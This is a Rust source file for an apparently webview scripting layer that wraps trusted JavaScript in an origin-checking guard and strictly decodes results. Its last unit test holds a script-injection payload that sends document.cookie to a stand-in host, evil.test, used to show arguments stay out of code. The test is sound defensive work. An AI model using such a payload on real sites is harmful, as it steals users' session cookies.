//! Trusted async script bodies, the framework wrapper that guards them, and
//! the strict decoder for what they return.
//!
//! Every backend runs the same wrapper as an async function body with one
//! string argument, [`INPUT_ARGUMENT`], holding JSON: the expected origin,
//! the app's arguments, and the result limits. The wrapper checks
//! `window.location.origin` and the main frame before and after awaiting the
//! app's body, validates the value, and returns one JSON string envelope.
//! Arguments never occupy a code position.

use std::borrow::Cow;
use std::fmt;

use serde_json::Value;

use crate::policy::Origin;
use crate::{DocumentId, EvalError, EvaluationLimits};

/// Trusted application code: the body of an async function that receives
/// one `args` value and returns (or resolves to) a JSON value. Runs in the
/// page's own JavaScript world, in strict mode, so it can call the page's
/// globals.
///
/// Arguments travel as data and are never spliced into the source. Keep
/// the body a constant; never build it from page or user data.
#[derive(Clone)]
pub struct AsyncScript {
    body: Cow<'static, str>,
    args: Value,
}

impl AsyncScript {
    /// `body` with `args` set to `null`.
    pub fn new(body: impl Into<Cow<'static, str>>) -> Self {
        Self {
            body: body.into(),
            args: Value::Null,
        }
    }

    /// The value the body sees as `args`.
    pub fn args(mut self, args: Value) -> Self {
        self.args = args;
        self
    }

    /// [`Self::args`] from any serializable value.
    pub fn with_args<T: serde::Serialize>(self, args: &T) -> Result<Self, serde_json::Error> {
        Ok(self.args(serde_json::to_value(args)?))
    }
}

impl fmt::Debug for AsyncScript {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("AsyncScript(..)")
    }
}

/// Where a script may run: one expected origin and the committed document
/// the app observed ([`crate::WebViewEvent::NavigationCommitted`]). It can
/// narrow the webview's evaluation origins but never widen them.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct OriginGuard {
    pub(crate) origin: Origin,
    pub(crate) document: DocumentId,
}

impl OriginGuard {
    pub fn new(origin: Origin, document: DocumentId) -> Self {
        Self { origin, document }
    }
}

/// A value a script returned: JSON null, a boolean, a finite number, a
/// string, or arrays and plain objects of those. `Debug` shows only its
/// kind, since it may hold a credential.
#[derive(Clone, PartialEq)]
pub struct ScriptValue(Value);

impl ScriptValue {
    pub fn into_json(self) -> Value {
        self.0
    }

    pub fn as_json(&self) -> &Value {
        &self.0
    }
}

impl fmt::Debug for ScriptValue {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let kind = match &self.0 {
            Value::Null => "null",
            Value::Bool(_) => "boolean",
            Value::Number(_) => "number",
            Value::String(_) => "string",
            Value::Array(_) => "array",
            Value::Object(_) => "object",
        };
        write!(f, "ScriptValue({kind})")
    }
}

/// Text from a page or engine, such as a JavaScript exception's message,
/// that may contain secrets. `Debug` and `Display` redact it; read it with
/// [`Self::reveal`] only where it cannot reach logs.
#[derive(Clone, PartialEq, Eq, Hash, Default)]
pub struct ErrorDetail(String);

impl ErrorDetail {
    pub(crate) fn new(detail: impl Into<String>) -> Self {
        Self(detail.into())
    }

    pub fn reveal(&self) -> &str {
        &self.0
    }
}

impl fmt::Debug for ErrorDetail {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("ErrorDetail(..)")
    }
}

impl fmt::Display for ErrorDetail {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("<redacted>")
    }
}

/// Why a script's result was refused, in [`EvalError::InvalidResult`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum InvalidResult {
    Undefined,
    BigInt,
    Function,
    Symbol,
    /// `NaN` or an infinity.
    NonFinite,
    /// An object reachable from itself.
    Cyclic,
    /// Nested deeper than [`EvaluationLimits::max_depth`].
    TooDeep,
    /// An object that is not a plain object or array: a `Date`, `Map`,
    /// DOM node, class instance, and so on.
    UnsupportedObject,
    /// Not the wrapper's envelope: the engine returned something else, or
    /// page code tampered with the wrapper.
    Malformed,
}

/// The argument name of the wrapper's single string input.
#[allow(dead_code)] // Read by the native backends.
pub(crate) const INPUT_ARGUMENT: &str = "quarkInput";

/// Bytes the `ok` envelope adds around the encoded value.
const OK_ENVELOPE_BYTES: usize = r#"{"quark":1,"status":"ok","value":}"#.len();

/// The guarded script ready for an engine.
#[derive(Clone, PartialEq, Eq)]
pub(crate) struct ScriptEnvelope {
    /// An async function body that reads [`INPUT_ARGUMENT`] and returns a
    /// string: for WKWebView `callAsyncJavaScript` and WebKitGTK
    /// `call_async_javascript_function`.
    pub(crate) body: String,
    /// The JSON to pass as [`INPUT_ARGUMENT`], as a native string argument.
    pub(crate) input: String,
}

#[allow(dead_code)] // Called by the Windows backend.
impl ScriptEnvelope {
    /// The body as a function declaration taking [`INPUT_ARGUMENT`], for
    /// CDP `Runtime.callFunctionOn`.
    pub(crate) fn function_declaration(&self) -> String {
        format!("async function ({INPUT_ARGUMENT}) {{\n{}\n}}", self.body)
    }
}

impl fmt::Debug for ScriptEnvelope {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("ScriptEnvelope(..)")
    }
}

const WRAPPER_HEAD: &str = r#""use strict";
const request = JSON.parse(quarkInput);
const reply = (status, fields) => JSON.stringify(Object.assign({ quark: 1, status: status }, fields));
const inPlace = () => window.top === window && window.location.origin === request.origin;
if (!inPlace()) return reply("wrong_origin");
let value;
try {
  value = await (async function (args) {
"#;

const WRAPPER_TAIL: &str = r#"
  })(request.args);
} catch (error) {
  const isError = error instanceof Error;
  return reply("exception", {
    name: isError ? String(error.name) : typeof error,
    message: isError ? String(error.message) : "",
  });
}
if (!inPlace()) return reply("wrong_origin");
const ancestors = new Set();
const problem = (item, depth) => {
  if (depth > request.maxDepth) return "too_deep";
  if (item === null) return null;
  switch (typeof item) {
    case "boolean":
    case "string":
      return null;
    case "number":
      return Number.isFinite(item) ? null : "non_finite";
    case "undefined":
      return "undefined";
    case "bigint":
      return "bigint";
    case "function":
      return "function";
    case "symbol":
      return "symbol";
  }
  if (ancestors.has(item)) return "cyclic";
  const isArray = Array.isArray(item);
  const prototype = Object.getPrototypeOf(item);
  if (!isArray && prototype !== Object.prototype && prototype !== null) return "unsupported_object";
  ancestors.add(item);
  try {
    for (const key of isArray ? item.keys() : Object.keys(item)) {
      const found = problem(item[key], depth + 1);
      if (found !== null) return found;
    }
  } finally {
    ancestors.delete(item);
  }
  return null;
};
const found = problem(value, 1);
if (found !== null) return reply("invalid_result", { reason: found });
const encoded = JSON.stringify({ quark: 1, status: "ok", value: value });
if (encoded.length > request.maxBytes) return reply("too_large");
return encoded;"#;

/// Wrap `script` to run only in a main-frame document of `origin`.
pub(crate) fn envelope(
    script: &AsyncScript,
    origin: &Origin,
    limits: &EvaluationLimits,
) -> ScriptEnvelope {
    let mut body =
        String::with_capacity(WRAPPER_HEAD.len() + script.body.len() + WRAPPER_TAIL.len());
    body.push_str(WRAPPER_HEAD);
    body.push_str(&script.body);
    body.push_str(WRAPPER_TAIL);
    let input = serde_json::json!({
        "origin": origin.to_string(),
        "args": script.args,
        "maxDepth": limits.max_depth,
        "maxBytes": limits.max_result_bytes + OK_ENVELOPE_BYTES,
    });
    ScriptEnvelope {
        body,
        input: input.to_string(),
    }
}

/// What an engine handed back for one evaluation.
#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)] // Constructed by the native backends.
pub(crate) enum RawEvaluation {
    /// The wrapper's returned string.
    Envelope(String),
    /// The engine resolved to something other than a string.
    NotAString,
    /// The wrapper itself threw, so the page broke a global it relies on.
    WrapperFailed,
    /// The engine failed the call: cancelled, process gone, unsupported, or
    /// a platform error.
    Failed(EvalError),
}

/// Decode an engine's answer under `limits`. Page code can tamper with the
/// wrapper's globals, so nothing in the envelope is trusted beyond its
/// shape.
pub(crate) fn decode(
    raw: RawEvaluation,
    limits: &EvaluationLimits,
) -> Result<ScriptValue, EvalError> {
    let text = match raw {
        RawEvaluation::Envelope(text) => text,
        RawEvaluation::NotAString | RawEvaluation::WrapperFailed => {
            return Err(EvalError::InvalidResult(InvalidResult::Malformed));
        }
        RawEvaluation::Failed(error) => return Err(error),
    };
    if text.len() > limits.max_result_bytes + OK_ENVELOPE_BYTES {
        return Err(EvalError::ResultTooLarge);
    }
    let malformed = EvalError::InvalidResult(InvalidResult::Malformed);
    let Ok(Value::Object(mut fields)) = serde_json::from_str::<Value>(&text) else {
        return Err(malformed);
    };
    if fields.remove("quark") != Some(Value::from(1)) {
        return Err(malformed);
    }
    let Some(Value::String(status)) = fields.remove("status") else {
        return Err(malformed);
    };
    let mut string = |key: &str| match fields.remove(key) {
        Some(Value::String(text)) => Some(text),
        _ => None,
    };
    let result = match status.as_str() {
        "ok" => match fields.remove("value") {
            Some(value) if depth(&value) > limits.max_depth as usize => {
                Err(EvalError::InvalidResult(InvalidResult::TooDeep))
            }
            Some(value) => Ok(ScriptValue(value)),
            None => Err(malformed.clone()),
        },
        "wrong_origin" => Err(EvalError::WrongOrigin),
        "too_large" => Err(EvalError::ResultTooLarge),
        "exception" => {
            let name = string("name").unwrap_or_default();
            let message = string("message").unwrap_or_default();
            Err(EvalError::JavaScriptException(ErrorDetail::new(format!(
                "{name}: {message}"
            ))))
        }
        "invalid_result" => Err(EvalError::InvalidResult(
            match string("reason").as_deref() {
                Some("undefined") => InvalidResult::Undefined,
                Some("bigint") => InvalidResult::BigInt,
                Some("function") => InvalidResult::Function,
                Some("symbol") => InvalidResult::Symbol,
                Some("non_finite") => InvalidResult::NonFinite,
                Some("cyclic") => InvalidResult::Cyclic,
                Some("too_deep") => InvalidResult::TooDeep,
                Some("unsupported_object") => InvalidResult::UnsupportedObject,
                _ => InvalidResult::Malformed,
            },
        )),
        _ => Err(malformed.clone()),
    };
    if !fields.is_empty() {
        return Err(malformed);
    }
    result
}

/// Nesting depth with the outermost value at 1, matching the wrapper.
fn depth(value: &Value) -> usize {
    let mut deepest = 0;
    let mut stack = vec![(value, 1)];
    while let Some((value, level)) = stack.pop() {
        deepest = deepest.max(level);
        match value {
            Value::Array(items) => stack.extend(items.iter().map(|item| (item, level + 1))),
            Value::Object(fields) => stack.extend(fields.values().map(|item| (item, level + 1))),
            _ => {}
        }
    }
    deepest
}

#[cfg(test)]
mod tests {
    use super::*;

    fn decoded(text: &str) -> String {
        let result = decode(
            RawEvaluation::Envelope(text.to_owned()),
            &EvaluationLimits::default(),
        );
        match result {
            Ok(value) => format!("ok {}", value.into_json()),
            Err(EvalError::InvalidResult(kind)) => format!("invalid {kind:?}"),
            Err(EvalError::JavaScriptException(detail)) => format!("exception {}", detail.reveal()),
            Err(error) => format!("error {error:?}"),
        }
    }

    fn nested(levels: usize) -> String {
        format!("{}{}", "[".repeat(levels), "]".repeat(levels))
    }

    #[test]
    fn envelopes_decode_strictly() {
        for (text, expected) in [
            (r#"{"quark":1,"status":"ok","value":"tok"}"#, r#"ok "tok""#),
            (r#"{"quark":1,"status":"ok","value":null}"#, "ok null"),
            (
                r#"{"quark":1,"status":"ok","value":{"a":[1,true]}}"#,
                r#"ok {"a":[1,true]}"#,
            ),
            (r#"{"quark":1,"status":"ok"}"#, "invalid Malformed"),
            (
                r#"{"quark":2,"status":"ok","value":1}"#,
                "invalid Malformed",
            ),
            (
                r#"{"quark":1,"status":"ok","value":1,"origin":"x"}"#,
                "invalid Malformed",
            ),
            (r#"{"quark":1,"status":"granted"}"#, "invalid Malformed"),
            (r#""tok""#, "invalid Malformed"),
            ("null", "invalid Malformed"),
            ("not json", "invalid Malformed"),
            (
                r#"{"quark":1,"status":"wrong_origin"}"#,
                "error WrongOrigin",
            ),
            (
                r#"{"quark":1,"status":"too_large"}"#,
                "error ResultTooLarge",
            ),
            (
                r#"{"quark":1,"status":"exception","name":"TypeError","message":"no getter"}"#,
                "exception TypeError: no getter",
            ),
            (
                r#"{"quark":1,"status":"invalid_result","reason":"undefined"}"#,
                "invalid Undefined",
            ),
            (
                r#"{"quark":1,"status":"invalid_result","reason":"cyclic"}"#,
                "invalid Cyclic",
            ),
            (
                r#"{"quark":1,"status":"invalid_result","reason":"?"}"#,
                "invalid Malformed",
            ),
        ] {
            assert_eq!(decoded(text), expected, "{text}");
        }
    }

    #[test]
    fn values_deeper_than_the_limit_are_refused() {
        let at_limit = format!(r#"{{"quark":1,"status":"ok","value":{}}}"#, nested(64));
        let past_limit = format!(r#"{{"quark":1,"status":"ok","value":{}}}"#, nested(65));
        assert!(decoded(&at_limit).starts_with("ok "));
        assert_eq!(decoded(&past_limit), "invalid TooDeep");
    }

    #[test]
    fn results_over_the_byte_limit_are_refused_before_parsing() {
        let limits = EvaluationLimits::default().max_result_bytes(8);
        let fits = r#"{"quark":1,"status":"ok","value":"123456"}"#;
        let over = r#"{"quark":1,"status":"ok","value":"1234567"}"#;
        assert!(decode(RawEvaluation::Envelope(fits.into()), &limits).is_ok());
        assert_eq!(
            decode(RawEvaluation::Envelope(over.into()), &limits),
            Err(EvalError::ResultTooLarge)
        );
    }

    #[test]
    fn arguments_stay_out_of_the_code() {
        let payload = r#"x"}); fetch("https://evil.test/" + document.cookie); ({"#;
        let script =
            AsyncScript::new("return args.name;").args(serde_json::json!({ "name": payload }));
        let origin = Origin::parse("https://example.com").unwrap();
        let envelope = envelope(&script, &origin, &EvaluationLimits::default());
        assert!(!envelope.body.contains("evil.test"));
        assert!(envelope.body.contains("\nreturn args.name;\n"));
        let input: Value = serde_json::from_str(&envelope.input).unwrap();
        assert_eq!(input["args"]["name"], payload);
        assert_eq!(input["origin"], "https://example.com");
    }
}
